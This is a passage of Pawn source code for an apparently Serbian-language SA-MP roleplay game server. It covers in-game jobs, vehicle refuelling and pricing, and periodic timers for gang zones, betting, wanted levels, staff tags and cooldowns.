		farmerInfo[ playerid ][ fiCowNumber ] = id;
		Novi_SetPlayerCheckpoint( playerid, milkInfo[ id ][ cpPos ][ 0 ], milkInfo[ id ][ cpPos ][ 1 ], milkInfo[ id ][ cpPos ][ 2 ], 1.0);
	    CheckpointStatus[ playerid ] = 16;
	    SendJobMessage( playerid, "Pomuzli ste kravu, pratite markere dalje!");
	    ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1 );
    }
	else if( id == 14 ) {
		SendJobMessage( playerid, "Zavrsili ste sa kravama, ubacite mleko u kamionet(tipkom {36AB00}~k~~PED_FIREWEAPON~ "col_white" )." );
		TogglePlayerControllable( playerid, true );
	    ClearAnimations( playerid );
	    DestroyPlayerObject( playerid, farmerInfo[ playerid ][ fiBucketObject ] );
    	SetPlayerAttachedObject( playerid, OBJECT_NOSI, 2613, 1, -0.200000, 1.000000, -0.699999, -9.000000, 90.000000, -21.000000);
        farmerInfo[ playerid ][ fiCowNumber ] = 14;
        ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1 );
	}
	return 1;
}
//------------------------------------------------------------------------------
public Istovar( playerid, vehicleid, broj )
{
	if( broj == 1) {
		TogglePlayerControllable( playerid, true );
		WOOD[ vehicleid ] = false;
	 	DestroyDynamicObject( WOODObject[ vehicleid ] );
	    GameTextForPlayer( playerid, "~w~Drvece je istovareno..", 5000, 1);
		Novi_SetPlayerCheckpoint( playerid, -569.0004, -93.3358, 63.9587, 5.0);
		CheckpointStatus[ playerid ] = 29;
		SendJobMessage( playerid, "Drvece je istovareno, vozi sada nazad do baze posla da uzmes zaradu." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 130;
    }
	if( broj == 2 ) {
	
	    TogglePlayerControllable( playerid, true );
	    GameTextForPlayer( playerid, "~w~Sljunak je istovaren..", 5000, 1);
		Novi_SetPlayerCheckpoint( playerid, 620.8951, 832.1742, -42.9609, 5.0);
		CheckpointStatus[ playerid ] = 30;
		SendJobMessage( playerid, "Sljunak je istovaren, vozi sada nazad do baze posla da uzmes zaradu." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 133;
	}
 	if( broj == 3 ) {
 	
	    TogglePlayerControllable( playerid, true );
	    GameTextForPlayer( playerid, "~w~Gorivo je istovareno, odvezi ga dalje po pumpama..", 5000, 1);
	    Novi_SetPlayerCheckpoint( playerid, 1001.3332, -905.1299, 43.1996, 5.0);
		CheckpointStatus[ playerid ] = 6;
		SendJobMessage( playerid, "Gorivo je istovareno, vozi ga dalje po pumpama(markeri)." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 65;
	}
	if( broj == 4 ) {
	
	    TogglePlayerControllable( playerid, true );
	    GameTextForPlayer( playerid, "~w~Gorivo je istovareno, odvezi ga dalje po pumpama..", 5000, 1);
	    Novi_SetPlayerCheckpoint( playerid, -97.3521,-1162.8250,3.3450, 5.0);
		CheckpointStatus[ playerid ] = 7;
		SendJobMessage( playerid, "Gorivo je istovareno, vozi ga dalje po pumpama(markeri)." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 45;
	}
	if( broj == 5 ) {
	
	    TogglePlayerControllable( playerid, true );
	    GameTextForPlayer( playerid, "~w~Gorivo je istovareno, odvezi ga dalje po pumpama..", 5000, 1);
	    Novi_SetPlayerCheckpoint( playerid, 1374.4653,458.4864,20.9276, 5.0);
		CheckpointStatus[ playerid ] = 8;
		SendJobMessage( playerid, "Gorivo je istovareno, vozi ga dalje po pumpama(markeri)." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 110;
	}
	if( broj == 6 ) {
	
	    TogglePlayerControllable( playerid, true );
	    GameTextForPlayer( playerid, "~w~Gorivo je istovareno..", 5000, 1);
		Novi_SetPlayerCheckpoint( playerid, 2482.1101, -2081.8760, 14.5476, 5.0);
		CheckpointStatus[ playerid ] = 31;
		SendJobMessage( playerid, "Gorivo je istovareno, vozi sada nazad do baze posla da uzmes zaradu." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 132;
	}
	if( broj == 7 ) {
	
	    TogglePlayerControllable( playerid, true );
	    GameTextForPlayer( playerid, "~w~Cement je istovaren..", 5000, 1);
	    Novi_SetPlayerCheckpoint( playerid, 2427.3550, -1357.1913, 23.8696, 5.0);
		CheckpointStatus[ playerid ] = 24;
		SendJobMessage( playerid, "Cement je istovaren, vozi sada nazad do baze posla." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 65;
	}
	return 1;
}
public Utovar( playerid, vehicleid, broj ) {
	if( broj == 1 ) {
		TogglePlayerControllable( playerid, true );
		WOOD[ GetPlayerVehicleID( playerid ) ] = true;
		WOODObject[ GetPlayerVehicleID( playerid ) ] = CreateDynamicObject( 18609, 0, 0, 1500, 0, 0, 0 );
		AttachDynamicObjectToVehicle( WOODObject[ GetPlayerVehicleID( playerid ) ], GetPlayerVehicleID( playerid ), -0.075000, -4.874999, 0.750000, 0.000000, 0.000000, 0.000000 );
	    GameTextForPlayer( playerid, "~w~Drvece je utovareno, odvezi ga u pilanu..", 5000, 1);
	    Novi_SetPlayerCheckpoint( playerid, -1971.3014, -2431.9534, 31.2497, 5.0);
		CheckpointStatus[ playerid ] = 3;
		SendJobMessage( playerid, "Drvece je utovareno, vozi u pilanu da istovaris." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 129;
	}
	if( broj == 2 ) {
	    TogglePlayerControllable( playerid, true );
	    sljunak[ vehicleid ] = true;
	    GameTextForPlayer( playerid, "~w~Sljunak je utovaren, odvezi ga u San Fiero na gradiliste..", 5000, 1);
	    Novi_SetPlayerCheckpoint( playerid, -2119.2505,245.4850,35.2527, 10.0);
		CheckpointStatus[ playerid ] = 4;
		SendJobMessage( playerid, "Sljunak je utovaren, vozi u San Fiero na gradiliste." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 145;
	}
	if( broj == 3 ) {
	    if( GetVehicleModel( vehicleid ) != 515 ) return SendErrorMessage( playerid, " Morate biti u vozilu Roadtrain.");
	    if( !IsTrailerAttachedToVehicle( vehicleid ) ) return SendErrorMessage( playerid, " Moras prvo da zakacis prikolicu!");
		if( GetVehicleModel( GetVehicleTrailer( vehicleid ) ) != 584 ) return SendErrorMessage( playerid, " Morate imati zakacenu prikolicu.");
	    TogglePlayerControllable( playerid, true );
	    GameTextForPlayer( playerid, "~w~Gorivo je utovareno, odvezi ga po pumpama..", 5000, 1);
	    Novi_SetPlayerCheckpoint( playerid, 1945.4850, -1771.8986, 14.4654, 5.0);
		CheckpointStatus[ playerid ] = 5;
		SendJobMessage( playerid, "Gorivo je utovareno, vozi ga po pumpama(markeri)." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 52;
	}
	if( broj == 4 ) {
	    VehCement[ vehicleid ] = true;
	    PlayerCement[ playerid ] = vehicleid;
	    TogglePlayerControllable( playerid, true );
	    GameTextForPlayer( playerid, "~w~Cement je utovaren..", 5000, 1);
	    Novi_SetPlayerCheckpoint( playerid, 2632.2288, -2201.7471, 13.4481, 5.0);
		CheckpointStatus[ playerid ] = 23;
		SendJobMessage( playerid, "Cement je utovaren, odvezi ga sada nazad." );
		StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 145;
	}
	return 1;
}
//------------------------------------------------------------------------------
public Postaviotable( playerid, izbor ) {
	SetTablice( VehicleInfo[ izbor ][ vID ] );
	ClearAnimations( playerid );
	SetVehicleToRespawn( VehicleInfo[ izbor ][ vID ] );
	SCM( playerid, SVETLOPLAVA, "Postavio si tablice na vozilo." );
	return 1;
}
//------------------------------------------------------------------------------
public Fillup( playerid, fuel )
{
	new VID = GetPlayerVehicleID( playerid );
    TogglePlayerControllable( playerid, true );

    Fuel[ VID ] += fuel;
    FuelTime[ VID ] = 0;
    
    ServerInfo[ Gorivo ] -= fuel;
    SaveServerStats( );
    UpdateGorivoLabel( );
    
    PuniGorivo[ playerid ] = false;
    
    VehicleInfo[getVehicleScriptID(VID)][ vFuel ] = Fuel[ VID ];
	
	if( Eurosuper95( GetPlayerVehicleID( playerid ) ) ) {
	    SendClientMessageEx( playerid, SVETLOPLAVA, "* Vozilo napunjeno, za: $%d.", fuel*30 );
		DajIgracuNovac( playerid, -( fuel*30 ) );
		BussinesPumpaMoney( playerid, fuel*15 );
	}
	else if( Super95( GetPlayerVehicleID( playerid ) ) ) {
		SendClientMessageEx( playerid, SVETLOPLAVA, "* Vozilo napunjeno, za: $%d.", fuel*24 );
		DajIgracuNovac( playerid, -( fuel*24 ) );
		BussinesPumpaMoney( playerid, fuel*12 );
	}
	else if( Super98( GetPlayerVehicleID( playerid ) ) ) {
		SendClientMessageEx( playerid, SVETLOPLAVA, "* Vozilo napunjeno, za: $%d.", fuel*20 );
		DajIgracuNovac( playerid, -( fuel*20 ) );
		BussinesPumpaMoney( playerid, fuel*10 );
	}
	else if( Eurodizel( GetPlayerVehicleID( playerid ) ) ) {
		SendClientMessageEx( playerid, SVETLOPLAVA, "* Vozilo napunjeno, za: $%d.", fuel*20 );
		DajIgracuNovac( playerid, -( fuel*20 ) );
		BussinesPumpaMoney( playerid, fuel*10 );
	}
	else if( Dizel( GetPlayerVehicleID( playerid ) ) ) {
		SendClientMessageEx( playerid, SVETLOPLAVA, "* Vozilo napunjeno, za: $%d.", fuel*24 );
		DajIgracuNovac( playerid, -( fuel*24 ) );
		BussinesPumpaMoney( playerid, fuel*12 );
	}
	else if( LozUlje( GetPlayerVehicleID( playerid ) ) ) {
		SendClientMessageEx( playerid, SVETLOPLAVA, "* Vozilo napunjeno, za: $%d.", fuel*30 );
		DajIgracuNovac( playerid, -( fuel*30 ) );
		BussinesPumpaMoney( playerid, fuel*15 );
	}
	else if( Plin( GetPlayerVehicleID( playerid ) ) ) {
		SendClientMessageEx( playerid, SVETLOPLAVA, "* Vozilo napunjeno, za: $%d.", fuel*20 );
		DajIgracuNovac( playerid, -( fuel*20 ) );
		BussinesPumpaMoney( playerid, fuel*10 );
	}
}
//------------------------------------------------------------------------------
public CheckGas( playerid ) {
	static bool:InVehicle[ MAX_PLAYERS ];
	if( InVehicle[ playerid ] ) {
		InVehicle[ playerid ] = false;
	}
	if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
		new vehicle = GetPlayerVehicleID( playerid ),
		    engine, lights, alarm, doors, bonnet, boot, objective;
        GetVehicleParamsEx( vehicle, engine, lights, alarm, doors, bonnet, boot, objective );
		if( engine == 1 ) {
				FuelTime[ vehicle ]++;
				if( Fuel[ vehicle ] >= 1 ) {
				    if( FuelTime[ vehicle ] == 2 ) {
						if( Fuel[ vehicle ] <= 10 ) PlayerPlaySound( playerid, 1085, 0.0, 0.0, 0.0);

						if( GetPVarInt( playerid, "gGas" ) == 1) {
							if( !InVehicle[ playerid ] ) {
								InVehicle[ playerid ] = true;
							}
							if( !IsVehicleBajs( vehicle ) ) Fuel[ vehicle ] --;
						}
						if(IsVehicleBajs( vehicle ) || IsVehicleBrod( vehicle ) || IsVehicleLetelica( vehicle ) ) {
							Fuel[ vehicle ] ++;
						}
						FuelTime[ vehicle ] = 0;
					}
				}
				else {
				    SetPVarInt( playerid, "NoFuel", 1 );
					TogglePlayerControllable( playerid, false );
					SCM( playerid, CRVENA, "Nema vise goriva. Upisite /exit da bi ste napustili vozilo.");
				}
				if(getVehicleScriptID(vehicle) != -1 ) VehicleInfo[getVehicleScriptID(vehicle)][ vFuel ] = Fuel[ vehicle ];
		}
	}
  	return 1;
}
//------------------------------------------------------------------------------
FixHour(hour)
{
	hour = timeshift+hour;

	if(hour < 0)
	{
		hour = hour+24;
	}
	else if(hour > 23)
	{
		hour = hour-24;
	}
	shifthour = hour;
	return 1;
}
//------------------------------------------------------------------------------

task SyncTime[60000]()
{
	new tmphour,
	    	tmpminute,
	    		tmpsecond,
					year,
						month,
							day;
								

    getdate( year, month, day );
	gettimeEx( tmphour, tmpminute, tmpsecond );
	FixHour( tmphour );
	tmphour = shifthour;

    for( new i = 1; i < MAX_ATM; i++ ) {
        if( atmInfo[ i ][ atmExists ] == true ) {
			if( atmInfo[ i ][ atmVremeDoRoba ] != 0 ) {
		        atmInfo[ i ][ atmVremeDoRoba ]--;
		        if( atmInfo[ i ][ atmVremeDoRoba ] == 0 ) {
		            atmInfo[ i ][ atmPreseceneZice ] = false;
		            atmInfo[ i ][ atmProbijenBios ] = false;
		        }
			}
		}
	}
	
	for( new i = 1; i < MAX_GZONE; i++ ) {
	
	    if( gZoneInfo[ i ][ gZoneTime ] != 0 ) {
	    
	        gZoneInfo[ i ][ gZoneTime ]--;
	    }
	}
	
	if( tmpminute == 30 || tmpminute == 0 ) {
	    SetTimer( "RespawnCallGlobal", 60000, false );
		SCMA( 0xFFC0CBAA, "|RESPAWN| Server je automatski aktivirao respawn svih vozila!" );
		SCMA( 0xFFC0CBAA, "|RESPAWN| Respawn ce biti pokrenut za 1 minut." );

        SetTimerEx( "IzvlacenjeKuglica", 3000, false, "d", 1 );
	}
	
	if( ( tmphour > ghour ) || ( tmphour == 0 && ghour == 23 ) ) {


	    

		// format( globalstring, sizeof( globalstring ), ""SRVBOJA1SCM"Valhalla "col_white"RP Server: Trenutno je %d:00 sati.", tmphour );
		// OOCNews( BELA, globalstring );
		ghour = tmphour;

        if( tmphour == 21 ) {
			SetWeather( 10 );
		}

		if( realtime ) {
			SetWorldTime( tmphour );
			ServerInfo[ VremeInGame ] = tmphour;
		}
		DinamicWeather( );
		
		for( new i = 1; i < MAX_GZONE; i++ ) { //Zone dobijanje

            new filename[ 32 ];
            format( filename, sizeof( filename ), F_GZONE, i );

            if( fexist( filename ) ) {

    		    if( gZoneInfo[ i ][ gZoneGangID ] != -1 && gZoneInfo[i][gZoneVrsta] == 0) {

                    new wFile[40];
                    format(wFile, 40, O_FILE, gZoneInfo[ i ][ gZoneGangID ]);
                    if(fexist(wFile)) {

                        OI[ gZoneInfo[ i ][ gZoneGangID ] ][ oSafeMoney ] += 1500;
                        SaveOrganization( gZoneInfo[ i ][ gZoneGangID ] );
                    }
                    else {

                        gZoneInfo[ i ][ gZoneTaken ] = false;
                        gZoneInfo[ i ][ gZoneTakeable ] = true;
                        gZoneInfo[ i ][ gZoneTime ] = 0;
                        GZone_Refresh(i);
                        GZone_Save(i);
                    }

    		    }
            }
		}
		
		for( new f = 0; f < MAX_GOBJ; f++ ) {
		
		    if( IsValidDynamicObject( dGunData[ f ][ gObjID ] ) )
	        	DestroyDynamicObject( dGunData[ f ][ gObjID ] );

            if( IsValidDynamic3DTextLabel(gunLabel[f]))
                DestroyDynamic3DTextLabel(gunLabel[f]);
	        
			dGunData[ f ][ ObjPos ][ 0 ] = 0.0;
			dGunData[ f ][ ObjPos ][ 1 ] = 0.0;
			dGunData[ f ][ ObjPos ][ 2 ] = 0.0;
			dGunData[ f ][ gObjID ] = -1;
			dGunData[ f ][ ObjData ][ 0 ] = 0;
			dGunData[ f ][ ObjData ][ 1 ] = 0;


	    }

        for( new f = 0; f < MAX_AIRDROPS; f++ ) {
        
            if( IsValidDynamicObject( airdropData[ f ][ airObjID ] ) )
                DestroyDynamicObject( airdropData[ f ][ airObjID ] );

            if( IsValidDynamic3DTextLabel(airdropLabel[f]))
                DestroyDynamic3DTextLabel(airdropLabel[f]);
            
            airdropData[ f ][ airPosition ][ 0 ] = 0.0;
            airdropData[ f ][ airPosition ][ 1 ] = 0.0;
            airdropData[ f ][ airPosition ][ 2 ] = 0.0;
            airdropData[ f ][ airObjID ] = -1;
            airdropData[ f ][ airData ] = 0;
        }
	    
	    IzvuciRezultateKladionica( );
	    
	    foreach( Player, playerid ) {
	    
	        new bool:tiket = false;
	        if( KladionicaListic[ playerid ][ Uplaceno ] && !KladionicaListic[ playerid ][ Zavrseno ] ) {
	            
	            for(  new i = 0; i < 10; i++ ) {
	            
		            if( KladionicaListic[ playerid ][ keciksdva ][ i ] != -1 ) {

		            	if( Parovi[ KladionicaListic[ playerid ][ parID ][ i ] ][ Rezultat ][ 2 ] == KladionicaListic[ playerid ][ keciksdva ][ i ] ) {

							tiket = true;
						}
						else if( Parovi[ KladionicaListic[ playerid ][ parID ][ i ] ][ Rezultat ][ 2 ] != KladionicaListic[ playerid ][ keciksdva ][ i ] ) {

							tiket = false;
							break;
						}

					}
				}
	        }
	        if( tiket == true ) {
	        
	            KladionicaListic[ playerid ][ Status ] = true;
	            KladionicaListic[ playerid ][ Zavrseno ] = true;
				KladionicaListic[ playerid ][ Uplaceno ] = true;
				SaveKladionica( playerid );
	        }
	        else if( tiket == false ) {
	        
	            KladionicaListic[ playerid ][ Status ] = false;

				KladionicaListic[ playerid ][ Uplaceno ] = true;
				KladionicaListic[ playerid ][ Zavrseno ] = true;

			 	SaveKladionica( playerid );
	        
	        }
	    }
	    
	    PostaviParoveKladionica( );
	}
	foreach( Player, i ) {
	    AFKCheck( i );

	    PayCheck( i );

		CheckGas( i );

		OtherCheck( i );

		if( PlayerInfo[ i ][ xWanted ] != 0 && GetPlayerInterior( i ) == 0 && GetPlayerVirtualWorld( i ) == 0 ) {
		    MinutiIgraca[ i ]++;
			if( MinutiIgraca[ i ] == 6 ) {
			    MinutiIgraca[ i ] = 0;
				PlayerInfo[ i ][ xWanted ]--;
			    Novi_SetPlayerWantedLevel( i, PlayerInfo[ i ][ xWanted ] );
			    if( PlayerInfo[ i ][ xWanted ] == 0 ) {
				    strmid( ZlocinInfo[ i ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
					strmid( ZlocinInfo[ i ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
					strmid( ZlocinInfo[ i ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
				}
			}
		}
		
		if( PlayerInfo[ i ][ xPljackaVreme ] != 0 ) {
		    PlayerInfo[ i ][ xPljackaVreme ]--;
		}
		

		// if( PlayerInfo[ i ][ xZatvor ] == OBICAN_ZATVOR ) {
		// 	if( VremeZatvaranjaCelija == 2 && OtvoreneCelije == true ) {
		// 		SCM( i, SVETLOCRVENA, "ZATVOR | Celije se zatvaraju za 2 minuta, udjite u celije ili cete biti kaznjeni!");
		// 	}
	 //    	else if( VremeZatvaranjaCelija == 1 && OtvoreneCelije == true ) {
		// 		SCM( i, SVETLOCRVENA, "ZATVOR | Celije se zatvaraju za 1 minut, udjite u celije ili cete biti kaznjeni!");
		// 	}
		// 	else if( VremeZatvaranjaCelija == 0 && OtvoreneCelije == false ) {
		// 		if( IsPlayerInCell( i ) ) {
		// 			SCM( i, SVETLOCRVENA, "ZATVOR | Celije su se zatvorile!");
		// 	    }
		// 		else if( !IsPlayerInCell( i ) ) {
		// 			SCM( i, SVETLOCRVENA, "ZATVOR | Celije su se zatvorile, ostali ste van celija i dobili 10 minuta dodatne kazne!");
		// 			PlayerInfo[ i ][ xZatvorVreme ] += 10;
		// 			new rand = random( sizeof( RandomZatvor ) );
		// 			Novi_SetPlayerPos( i, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
  //                   SetPlayerWorldBounds(i, -1398.697143, -1472.672607, -1443.334228, -1605.534057);
		// 			SetTimerEx( "SlobodnoSada", 6000, false, "i", i );
		// 			GameTextForPlayer( i, "Ucitavanje ...", 1000, 4 );
		// 			TogglePlayerControllable( i, false );
		// 			SetCameraBehindPlayer( i );
		// 			SetPlayerInterior( i, 0 );
		// 			SetPlayerVirtualWorld( i, 0 );
		// 	    }
		// 	}
		// }

	}
	return 1;
}
//------------------------------------------------------------------------------
task GlobalTimer[1000]()
{
    new id = -1;

    new tmphour,
	    	tmpminute,
	    		tmpsecond,
					year,
						month,
							day;
								

    getdate( year, month, day );
	gettimeEx( tmphour, tmpminute, tmpsecond );
	FixHour( tmphour );
	tmphour = shifthour;

	

    if( cseconds ) {

        format( cstring, 6, "~w~%d", cseconds-1 );
        GameTextForAll( cstring, 1100, 4 );
        SoundForAll( 1056 );

        cseconds --;

        if( !cseconds )
        {
            GameTextForAll( "~r~GO GO GO!!!", 2000, 4 );
            SoundForAll( 1057 );
        }
    }
    foreach( Player, i ) {

		if( SearchNadji[ i ] != -1 ) {
		
		    if( IsPlayerConnected( SearchNadji[ i ] ) ) {
		
	        	new Float:X, Float:Y, Float:Z;
				GetPlayerPos( SearchNadji[ i ], X, Y, Z );
				Novi_SetPlayerCheckpoint( i, X, Y, Z, 6 );
			}
			else if( !IsPlayerConnected( SearchNadji[ i ] ) ) SearchNadji[ i ] = -1;

        }
        
        if( BlowJobCount[ i ] != 0 ) {

            BlowJobCount[ i ]--;
            new stringic[ 10 ];
            format( stringic, sizeof( stringic ), "%d", BlowJobCount[ i ] );
            PlayerTextDrawSetString( i, BLOWJOBCOVER[ i ][ 4 ], stringic );
		}

		if( NaDmEventu[ i ] == false) {
		
	        if( PlayerInfo[ i ][ xSkriptaRank ] == 1 ) {
				SetPlayerChatBubble( i, "[ DEVELOPER ]", AdminBoja, 40.0, 10000);
                //SetPlayerColor(i, AdminBoja);
			}
			else if( PlayerInfo[ i ][ xSkriptaRank ] == 2 ) {
				SetPlayerChatBubble( i, "[ CO-DEVELOPER ]", AdminBoja, 40.0, 10000);
                //SetPlayerColor(i, AdminBoja);
			}
			else if( PlayerInfo[ i ][ xSkriptaRank ] == 3 ) {
				SetPlayerChatBubble( i, "[ MAPPER ]", AdminBoja, 40.0, 10000);
                //SetPlayerColor(i, AdminBoja);
			}
			else if( PlayerInfo[ i ][ xSkriptaRank ] == 6 ) {
				SetPlayerChatBubble( i, "[ SUVLASNIK ]", VlasnikBoja, 40.0, 10000);
                if(AdminDuty[i]) 
                    SetPlayerColor(i, VlasnikBoja);
			}
			else if( PlayerInfo[ i ][ xAdmin ] == 7 ) {
				SetPlayerChatBubble( i, "[ VLASNIK ]", VlasnikBoja, 40.0, 10000);
                if(AdminDuty[i]) 
                    SetPlayerColor(i, VlasnikBoja);
			}
			else if( PlayerInfo[ i ][ xAdmin ] == 6 ) {
				SetPlayerChatBubble( i, "[ SUVLASNIK ]", VlasnikBoja, 40.0, 10000);
                if(AdminDuty[i]) 
                    SetPlayerColor(i, VlasnikBoja);
			}
			else if( PlayerInfo[ i ][ xAdmin ] == 5 ) {
				SetPlayerChatBubble( i, "[ HEAD ADMIN ]", SuvlasnikBoja , 40.0, 10000);
                if(AdminDuty[i]) 
                    SetPlayerColor(i, SuvlasnikBoja);
			}
	        else if( PlayerInfo[ i ][ xAdmin ] == 4 ) {
				SetPlayerChatBubble( i, "[ ADMINISTRATOR ]", AdminBoja, 40.0, 10000);
                //SetPlayerColor(i, AdminBoja);
			}
			else if( PlayerInfo[ i ][ xAdmin ] == 3 ) {
				SetPlayerChatBubble( i, "[ ADMINISTRATOR ]", AdminBoja, 40.0, 10000);
                //SetPlayerColor(i, AdminBoja);
			}
			else if( PlayerInfo[ i ][ xAdmin ] == 2 ) {
				SetPlayerChatBubble( i, "[ ADMINISTRATOR ]", AdminBoja, 40.0, 10000);
                //SetPlayerColor(i, AdminBoja);
			}
			else if( PlayerInfo[ i ][ xAdmin ] == 1 ) {
				SetPlayerChatBubble( i, "[ ADMINISTRATOR ]", AdminBoja, 40.0, 10000);
                //SetPlayerColor(i, AdminBoja);
			}
			else if( PlayerInfo[ i ][ xSpecAdmin ] == 1)
			{
				SetPlayerChatBubble(i, "[ SPEC ADMIN ]", CRNA, 40.0, 10000);
			}
			else if( PlayerInfo[ i ][ xSupporter ] == 3 ) {
				SetPlayerChatBubble( i, "[ H| HELER ]", 0x8EFF00FF, 40.0, 10000);
			}
			else if( PlayerInfo[ i ][ xSupporter ] >= 1 && PlayerInfo[ i ][ xSupporter ] <= 2 ) {
				SetPlayerChatBubble( i, "[ HELPER ]", 0x8EFF00FF, 40.0, 10000);
			}
			else if( PlayerInfo[ i ][ xVIPLevel ] >= 1 && PlayerInfo[ i ][ xWanted ] == 0 ) {
			
				new RankVip[16];
				if(PlayerInfo[i][xVIPLevel] == 1) RankVip = "[ VIP 1 ]";
				if(PlayerInfo[i][xVIPLevel] == 2) RankVip = "[ VIP 2 ]";
				if(PlayerInfo[i][xVIPLevel] == 3) RankVip = "[ VIP 3 ]";
				if(PlayerInfo[i][xVIPLevel] == 4) RankVip = "[ VIP 4 ]";
				if(PlayerInfo[i][xVIPLevel] == 5) RankVip = "[ VIP 5 ]";
				if(PlayerInfo[i][xVIPLevel] == 6) RankVip = "[ VIP 6 ]";
				SetPlayerChatBubble( i, RankVip, 0xB40404AA, 40.0, 10000);
				
				if( PlayerInfo[ i ][ xVIPLevel ] >= 5 && !PlayerInfo[ i ][ xDBO ] ) {
	   				SetPlayerColor( i, 0x00FF0000 );
				}
			}
			else if( PlayerInfo[ i ][ xPromoter ] == 1 ) {
				SetPlayerChatBubble( i, "[ PROMOTER ]", 0xFF8000AA, 40.0, 10000);
			}
		}

        if( PlayerInfo[ i ][ xMute ] != 0 ) {
			PlayerInfo[ i ][ xMute ]--;
			if( PlayerInfo[ i ][ xMute ] <= 0 ) {
			    PlayerInfo[ i ][ xMute ] = 0;
			}
		}

        if( VremeZaNovac[ i ] != 0 ) {
            VremeZaNovac[ i ]--;
            if( VremeZaNovac[ i ] == 0 ) {
                SendClientMessageEx( i, NARACRVENA, "Preziveli ste 2 minuta i dobili %d$.", PljackaNovac[ i ] );
				DajIgracuNovac( i, PljackaNovac[ i ] );
				PljackaNovac[ i ] = 0;
			}
        }
        
        if( VremeZaZlato[ i ] != 0 ) {
            VremeZaZlato[ i ]--;
            if( VremeZaZlato[ i ] == 0 ) {
                SendClientMessageEx( i, NARACRVENA, "Preziveli ste 2 minuta i dobili %dg zlata.", PljackaZlato[ i ] );
				PlayerInfo[ i ][ xZlato ] += PljackaZlato[ i ];
				SavePlayer( i );
				PljackaZlato[ i ] = 0;
			}
        }

        if( Polaganje[ i ] >= 1 ) {
			if( IsPlayerInAnyVehicle( i ) ) {
	     	    if( GetSpeed( i ) > 100 ) {
	     	        GreskaVoznja[ i ]++;
	     	        SCM( i, -1, ""col_orange"[Instruktor]: "col_white"Prekoracili ste brzinu od 100km/h na gradskoj voznji i dobili gresku!");
	     	        if( GreskaVoznja[ i ] == 3 ) {
		     	        Polaganje[ i ] = 0;
		     	        GreskaVoznja[ i ] = 0;
		    			Novi_DisablePlayerCheckpoint( i );
						Novi_RemovePlayerFromVehicle( i );
						SCM( i, -1, ""col_orange"[Instruktor]: "col_white"Pali ste na vozackom ispitu jer ste prekoracili brzinu od 100km/h 3 puta!");
		    			SetVehicleToRespawn( GetPlayerVehicleID( i ) );
					}
				}
			}
		}
        if( IsPlayerInAnyVehicle( i ) && GetPlayerState( i ) == PLAYER_STATE_DRIVER && GetSpeed( i ) > 10 ) {

            new autoid = getVehicleScriptID(GetPlayerVehicleID(i));
            
            if( autoid != -1 ) {
            
			    VehicleInfo[ autoid ][ vMetri ] += ( GetSpeed( i )*10 )/36;
			    if( VehicleInfo[ autoid ][ vMetri ] > 999 ) {

					VehicleInfo[ autoid ][ vKilometri ]++;
					VehicleInfo[ autoid ][ vMetri ] = 0;
				}
			}
		}

        if(oglasTimer[i] > 0) oglasTimer[i]--;

        if( ReportGlobal[ i ] > 0 ) ReportGlobal[ i ]--;
        
        if( VIPPort[ i ] > 0 ) VIPPort[ i ]--;

        if( skoroZauzimao[i] > 0) skoroZauzimao[i]--;

        if( VipFix[i] > 0) VipFix[i]--;

        if(VipFuelTime[i] > 0) VipFuelTime[i]--;

        if( VipGChat[i] > 0) VipGChat[i]--;

        if( VipGoto[i] > 0) VipGoto[i]--;

        if( VipMenuTime[i] > 0) VipMenuTime[i]--;
        
        if( PromoterPort[ i ] > 0 ) PromoterPort[ i ]--;

		if( PomocGlobal[ i ] > 0 ) PomocGlobal[ i ]--;
		
		if( NewGlobal[ i ] > 0 ) NewGlobal[ i ]--;

        if( antiCheatCS[ i ][ SpamChat ] > 0 ) antiCheatCS[ i ][ SpamChat ]--;

		if( antiCheatCS[ i ][ SpamCommand ] > 0 ) antiCheatCS[ i ][ SpamCommand ]--;
		
		if( DropedGun[ i ] > 0 ) DropedGun[ i ]--;

		CarDamageTimer( i );
		
		CheckWeapons( i );

		CheckTeleports( i );
		
		DrugCheck( i );

		AntiCheat( i );

		CellphoneCheck( i );

  //       if( GetFactionType( i ) != ORG_TIP_PD && !IsPlayerInAnyVehicle( i ) ) {

		// 	if( GetPlayerWeapon( i ) >= 24 && GetPlayerWeapon( i ) <= 40 ) {

		// 		if( Javno3( i ) || Javno4( i ) || Javno5( i ) || Javno6( i ) || Javno7( i ) || Javno8( i ) || IsPlayerInRangeOfPoint( i, 10, 1133.5189, -936.0316, 47.7939 ) ) {

		// 			if( antiCheatCS[ i ][ ArmedWeapon ] < 3 ) {
		// 				SetPlayerArmedWeapon( i, 0 );
		// 				antiCheatCS[ i ][ ArmedWeapon ] ++;
		// 				SendClientMessageEx( i, ANTICHEAT, "Ne mozete koristiti oruzje na javnom mestu! Upozorenje %d/3.", antiCheatCS[ i ][ ArmedWeapon ] );
		// 			}
		// 			if( antiCheatCS[ i ][ ArmedWeapon ] == 3 ) {
					
		// 				SendClientMessageEx( i, ANTICHEAT, "Ne mozete koristiti oruzje na javnom mestu! Upozorenje %d/3.", antiCheatCS[ i ][ ArmedWeapon ] );
		// 				antiCheatCS[ i ][ ArmedWeapon ] = 0;
		// 				GameTextForPlayer( i, "~r~Oduzeto vam je oruzje!", 2500, 1 );
		// 				ResetAllWeapons( i );
		// 				return 1;
		// 			}
		// 		}
		// 	}
		// }

		if( TrashLimit[ i ] != 0 ) {
		    TrashLimit[ i ]--;
